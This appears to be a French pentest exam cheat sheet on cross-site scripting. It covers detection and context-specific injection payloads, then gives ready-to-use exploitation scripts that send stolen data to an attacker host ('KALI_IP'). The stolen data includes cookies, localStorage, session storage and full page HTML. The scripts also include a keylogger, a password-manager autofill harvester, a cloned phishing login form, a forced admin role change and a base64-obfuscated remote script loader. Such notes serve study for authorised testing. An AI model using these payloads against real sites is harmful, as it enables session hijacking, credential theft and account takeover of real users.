# XSS - Cross-Site Scripting

## 1. Types de XSS

| Type                 | Stockage                  | Déclenchement                  |
|----------------------|---------------------------|--------------------------------|
| **Reflected Server** | Non stocké                | Param GET dans URL             |
| **Stored Server**    | Stocké en BDD             | Chargement page                |
| **Reflected Client** | Non stocké                | Injection dans JS côté client  |
| **Stored Client**    | Stocké (localStorage/BDD) | JS côté client lit les données |

---

## 2. Détection

### 2.1 Payload de détection basique

```javascript
<script>alert(0)</script>
```

### 2.2 Détection multi-contexte

```
'"><img src=x onerror=alert(1)>
```

```
'"><img src=x>{{7*7}}${7*7};sleep 5
```

### 2.3 Identifier le contexte d'injection

Injecter un **canary** (mot unique traçable) dans chaque paramètre, puis inspecter le code source :

```
canary123
```

Observer :

- Dans un attribut HTML → `<input value="canary123">` → tenter de fermer l'attribut
- Dans un tag `<script>` → `var x = "canary123"` → injection JS directe
- Encodé en HTML `&lt;` → filtre présent, tenter un autre vecteur

### 2.4 Fuzzing avec wfuzz

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-BruteLogic.txt \
  --hh 0 \
  "http://TARGET/index.php?param=FUZZ"
```

---

## 3. Payloads par contexte

### 3.1 HTML standard

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### 3.2 Attribut HTML (entre guillemets)

```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><script>alert(1)</script>
```

### 3.3 Injection dans JavaScript existant

```javascript
// Si : var x = "INJECTION"
";alert(1);//
'+alert(1)+'
'-alert(1)-'
```

### 3.4 Injection via innerHTML (DOM XSS)

```javascript
// <script> bloqué dans innerHTML → utiliser event handler
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 3.5 Base64 + eval (bypass filtres)

```javascript
// Encoder le payload en Base64 (dans Burp Decoder)
eval(atob('YWxlcnQoMSk='))

// Avec jQuery.getScript() si jQuery disponible
'+eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovL0tBTEkvdHNzLmpzJyk='))+'

// Wrapper btoa() pour éviter erreurs dans l'URL
'+btoa(eval(atob('PAYLOAD_B64')))+'
```

---

## 4. Exploitation

### 4.1 Setup : Script externe

```bash
# Sur Kali
mkdir ~/xss && cd ~/xss
nano xss.js             # écrire le payload JS
python3 -m http.server 80
```

```html
<!-- Payload injecté dans la cible -->
<script src="http://KALI_IP/xss.js"></script>
```

**Lire les logs** pour confirmer exécution :
```
192.168.x.x - "GET /xss.js" 200   ← toi (test)
192.168.x.y - "GET /xss.js" 200   ← victime ✅
```

---

### 4.2 Vol de cookies

```javascript
// xss.js
let cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("http://KALI_IP/exfil?data=" + encodedCookie)
```

!!! warning "HttpOnly"
  Si le cookie est HttpOnly, `document.cookie` retourne vide.
  **Chercher d'autres secrets** : localStorage, sessionStorage, DOM.

---

### 4.3 Vol de localStorage / sessionStorage

```javascript
// xss.js
let data = JSON.stringify(localStorage)
fetch("http://KALI_IP/exfil?data=" + encodeURIComponent(data))
```

```javascript
// sessionStorage
let data = JSON.stringify(sessionStorage)
fetch("http://KALI_IP/exfil?data=" + encodeURIComponent(data))
```

---

### 4.4 Exfiltration DOM complet

```javascript
// Exfiltre tout le HTML de la page (contient souvent tokens, données)
window.location.href = "http://KALI_IP/?data=" + btoa(document.body.innerHTML)
```

```javascript
// Version fetch (silencieuse, pas de redirection)
let dom = document.documentElement.outerHTML
fetch("http://KALI_IP/exfil?data=" + encodeURIComponent(dom))
```

---

### 4.5 Keylogger

```javascript
// xss.js
function logKey(event){
  fetch("http://KALI_IP/k?key=" + event.key)
}
document.addEventListener('keydown', logKey)
```

---

### 4.6 Vol de mots de passe (gestionnaire)

```javascript
// xss.js — crée des inputs invisibles, le gestionnaire les remplit
let body = document.getElementsByTagName("body")[0]

var u = document.createElement("input")
u.type = "text"
u.style.position = "fixed"
u.style.opacity = "0"

var p = document.createElement("input")
p.type = "password"
p.style.position = "fixed"
p.style.opacity = "0"

body.append(u)
body.append(p)

setTimeout(function(){
  fetch("http://KALI_IP/k?u=" + u.value + "&p=" + p.value)
}, 5000)
```

**Résultat dans les logs :**
```
GET /k?u=admin@target.com&p=P@ssw0rd
```

---

### 4.7 Phishing — Page de login clonée

```javascript
// xss.js — clone la vraie page de login
fetch("login").then(res => res.text().then(data => {
  document.getElementsByTagName("html")[0].innerHTML = data
  document.getElementsByTagName("form")[0].action = "http://KALI_IP"
  document.getElementsByTagName("form")[0].method = "get"
}))
```

```javascript
// xss.js — page de login custom si pas de /login
document.body.innerHTML = "<h1>Session expirée</h1><form action=http://KALI_IP/login method=get><input name=username placeholder=username><input name=password type=password placeholder=password><input type=submit value=Login></form>"
```

---

### 4.8 Requête côté victime (CSRF-like via XSS)

```javascript
// xss.js — la victime envoie une requête POST à sa propre appli
fetch('http://TARGET/admin/updateUser', {
  method: 'POST',
  mode: 'same-origin',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'username=hacked&role=admin'
})
```

---

## 5. DOM XSS — Cas spécial base64

Quand les données sont encodées dans l'URL (ex: paramètre `csv=BASE64`) :

```bash
# 1. Décoder le contenu actuel
# Dans la console navigateur :
atob("IyxVc2VyLGFjdGl2ZQ==")
# → "#,User,active\n..."

# 2. Créer le payload malveillant
btoa("#,User,active\n24895,Samantha<img src=x onerror=alert(1)>,1")
# → "IyxVc2VyLGFjdGl2ZQo..."

# 3. Injecter dans l'URL
http://TARGET/app/?csv=NOUVEAU_BASE64
```

---

## 6. Workflow complet exam

```
1. Identifier tous les inputs (GET, POST, headers, cookies)
2. Injecter canary pour localiser le reflet dans la page
3. Inspecter le contexte (HTML brut / attribut / JS)
4. Choisir le payload adapté au contexte
5. Test alert(1) pour confirmer l'exécution
6. Préparer xss.js + python3 -m http.server 80
7. Injecter <script src="http://KALI/xss.js"></script>
8. Vérifier les logs → confirmer la victime
9. Adapter xss.js selon l'objectif (cookie, localStorage, phishing)
```

!!! tip "Astuce exam"
  Si `<script>` est bloqué → tester `<img src=x onerror=...>`  
  Si `"` est encodé → tenter `'` ou sans guillemets  
  Si le filtre bloque `alert` → tester `confirm(1)` ou `prompt(1)`